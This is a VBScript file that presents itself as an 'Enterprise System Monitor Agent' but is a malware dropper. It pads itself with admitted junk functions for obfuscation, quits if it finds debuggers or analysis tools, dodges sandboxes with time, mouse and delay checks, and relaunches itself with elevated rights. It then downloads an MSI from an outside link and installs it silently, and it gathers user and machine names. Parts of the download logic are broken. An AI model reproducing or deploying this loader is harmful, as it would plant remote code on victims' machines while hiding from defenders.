' --------------------------------------------------------------------------
'  Enterprise System Monitor Agent v3.7.2
'  Copyright (c) 2023 Enterprise Solutions Inc.
' --------------------------------------------------------------------------
Option Explicit

' Initialize system variables
Dim WshShell, Fso, NetObj
Set WshShell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")
Set NetObj = CreateObject("WScript.Network")

' Dummy variables for obfuscation
Dim dummy1, dummy2, dummy3, dummy4, dummy5
dummy1 = "System initialization"
dummy2 = "Network configuration"
dummy3 = "Security validation"
dummy4 = "Performance monitoring"
dummy5 = "Error reporting"

' Fake system information collection
Function GetSystemInfo()
    Dim result
    result = NetObj.ComputerName & "|" & NetObj.UserName
    GetSystemInfo = result
End Function

' Fake process validation function
Function ValidateProcess(processName)
    Dim colProcesses, objProcess
    On Error Resume Next
    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
    
    ValidateProcess = False
    For Each objProcess in colProcesses
        ValidateProcess = True
        Exit For
    Next
End Function

' Fake network adapter information
Function GetNetworkInfo()
    Dim result
    result = "Network adapter: " & NetObj.ComputerName
    GetNetworkInfo = result
End Function

' Registry operations helper
Function ReadRegKey(keyPath, valueName)
    On Error Resume Next
    ReadRegKey = WshShell.RegRead(keyPath & "\" & valueName)
    If Err.Number <> 0 Then ReadRegKey = ""
End Function

' Write registry value
Sub WriteRegKey(keyPath, valueName, value)
    On Error Resume Next
    WshShell.RegWrite keyPath & "\" & valueName, value, "REG_SZ"
End Sub

' File operations helper
Function CreateTempFile(prefix, extension)
    Dim tempFolder, fileName
    tempFolder = WshShell.ExpandEnvironmentStrings("%TEMP%")
    fileName = tempFolder & "\" & prefix & "_" & Round(Timer * 1000) & "." & extension
    Set CreateTempFile = Fso.CreateTextFile(fileName, True)
End Function

' Encryption helper function
Function SimpleEncrypt(text)
    Dim i, result
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
    Next
    SimpleEncrypt = result
End Function

' Decryption helper function
Function SimpleDecrypt(text)
    Dim i, result
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
    Next
    SimpleDecrypt = result
End Function

' Check for elevated privileges
Function IsElevated()
    On Error Resume Next
    IsElevated = False
    If WScript.Arguments.Named.Exists("elevated") Then
        IsElevated = True
    Else
        CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
        WScript.Quit
    End If
End Function

' Network connectivity check
Function CheckConnection(url)
    On Error Resume Next
    Dim objHTTP
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.open "HEAD", url, False
    objHTTP.send()
    If objHTTP.Status = 200 Then
        CheckConnection = True
    Else
        CheckConnection = False
    End If
    Set objHTTP = Nothing
End Function

' Fake hardware fingerprint generation
Function GetHardwareFingerprint()
    Dim result
    result = NetObj.ComputerName & "_" & NetObj.UserName
    GetHardwareFingerprint = result
End Function

' Fake memory status check
Function GetMemoryStatus()
    Dim result
    result = "Memory status: OK"
    GetMemoryStatus = result
End Function

' Fake disk space check
Function GetDiskSpace(drive)
    Dim result
    result = "Disk " & drive & ": Available"
    GetDiskSpace = result
End Function

' User account information
Function GetUserInfo()
    GetUserInfo = NetObj.UserName & "|" & NetObj.ComputerName & "|" & NetObj.UserDomain
End Function

' Check for debugger processes
Function IsDebuggerPresent()
    Dim debuggers, proc
    debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe", "cheatengine.exe", "procmon.exe", "procexp.exe")
    
    IsDebuggerPresent = False
    For Each proc In debuggers
        If ValidateProcess(proc) Then
            IsDebuggerPresent = True
            Exit For
        End If
    Next
End Function

' Anti-sandbox time delay
Sub AntiSandboxDelay()
    Dim startTime, endTime
    startTime = Timer
    endTime = startTime + 30 ' 30 second delay
    
    Do While Timer < endTime
        ' Do nothing - just waste time
        Dim dummy
        dummy = dummy & "x"
    Loop
End Sub

' Check for mouse activity (sandbox detection)
Function HasMouseActivity()
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Get mouse position twice with a small delay
    Dim pos1, pos2
    pos1 = objShell.AppActivate("WScript")
    WScript.Sleep 1000
    pos2 = objShell.AppActivate("WScript")
    
    ' If positions are the same, likely a sandbox
    HasMouseActivity = (pos1 <> pos2)
End Function

' Get Windows version details
Function GetWindowsVersion()
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    GetWindowsVersion = objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
End Function

' Check for specific files
Function FileExists(filePath)
    On Error Resume Next
    FileExists = Fso.FileExists(filePath)
    If Err.Number <> 0 Then FileExists = False
End Function

' Get environment variable
Function GetEnvVar(varName)
    GetEnvVar = WshShell.ExpandEnvironmentStrings("%" & varName & " %")
End Function

' More junk functions to add bulk
Function FakeFunction1()
    FakeFunction1 = "Fake result 1"
End Function

Function FakeFunction2()
    FakeFunction2 = "Fake result 2"
End Function

Function FakeFunction3()
    FakeFunction3 = "Fake result 3"
End Function

Function FakeFunction4()
    FakeFunction4 = "Fake result 4"
End Function

Function FakeFunction5()
    FakeFunction5 = "Fake result 5"
End Function

' Main execution starts here
' Perform system checks
Dim systemInfo, networkInfo, hwFingerprint, memStatus, diskSpace, userInfo
systemInfo = GetSystemInfo()
networkInfo = GetNetworkInfo()
hwFingerprint = GetHardwareFingerprint()
memStatus = GetMemoryStatus()
diskSpace = GetDiskSpace("C:")
userInfo = GetUserInfo()

' Anti-analysis checks
If IsDebuggerPresent() Then WScript.Quit

' Time-based anti-sandbox
If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit

' Check for user activity
If Not HasMouseActivity() Then WScript.Quit

' Additional delay to frustrate analysis
AntiSandboxDelay

' Check elevation status
If Not IsElevated() Then WScript.Quit

' Core functionality - download and execute
Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
strFile = strTemp & "\agent_installer.msi"

' Download with proper redirect handling
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.open "GET", strUrl, False
objXMLHTTP.send()

' Check for any redirect (301, 302, etc.)
If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
    strUrl = objXMLHTTP.getResponseHeader("Location")
    objXMLHTTP.open "GET", strUrl, False
    objXMLHTTP.send()
End If

' Verify download
If Not Fso.FileExists(strFile) Then
    WScript.Echo "Download failed - file not found"
    WScript.Quit
End If

' Check file size
Set objFile = Fso.GetFile(strFile)
If objFile.Size < 1024 Then  ' Less than 1KB suggests incomplete download
    WScript.Echo "Downloaded file appears incomplete: " & objFile.Size & " bytes"
    WScript.Quit
End If

' Create installation log
logFile = strTemp & "\install.log"

' Check if we got a successful response
If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strFile, 2 ' Overwrite
    objADOStream.Close

    ' Try installation with logging and visible window
    WScript.Echo "Installing... This may take a few minutes."
    objShell.Run "msiexec /i """ & strFile & """ /l*v """ & logFile & """ /quiet /qn /norestart", 1, True

    ' Check if installation succeeded
    If Fso.FileExists(logFile) Then
        Set objLog = Fso.OpenTextFile(logFile, 1)
        logContent = objLog.ReadAll
        objLog.Close
        
        ' Look for success or failure
        If InStr(logContent, "Installation completed successfully") > 0 Then
            WScript.Echo "Installation completed successfully"
        ElseIf InStr(logContent, "Error") > 0 Or InStr(logContent, "failed") > 0 Then
            WScript.Echo "Installation failed. Check log file: " & logFile
            WScript.Echo "Last few lines of log:"
            
            ' Show last few lines of log
            lines = Split(logContent, vbCrLf)
            For i = UBound(lines) - 5 To UBound(lines)
                If i >= 0 Then WScript.Echo lines(i)
            Next
        Else
            WScript.Echo "Installation status unclear. Check log file: " & logFile
        End If
    Else
        WScript.Echo "Installation log not created - installation may have failed immediately"
    End If

    ' Cleanup
    If Fso.FileExists(strFile) Then Fso.DeleteFile strFile
Else
    WScript.Echo "Download failed with status: " & objXMLHTTP.Status
End If

' Additional cleanup and logging
Dim sysLogFile, logContent
Set sysLogFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%TEMP%") & "\sysmon.log", True)
logContent = "System Info: " & systemInfo & vbCrLf & _
             "Network Info: " & networkInfo & vbCrLf & _
             "Hardware ID: " & hwFingerprint & vbCrLf & _
             "Memory: " & memStatus & vbCrLf & _
             "Disk Space: " & diskSpace & vbCrLf & _
             "User Info: " & userInfo & vbCrLf & _
             "Windows Version: " & GetWindowsVersion() & vbCrLf & _
             "Execution Time: " & Now

sysLogFile.WriteLine logContent
sysLogFile.Close

' Final cleanup
Set WshShell = Nothing
Set Fso = Nothing
Set NetObj = Nothing
Set objXMLHTTP = Nothing
Set objADOStream = Nothing
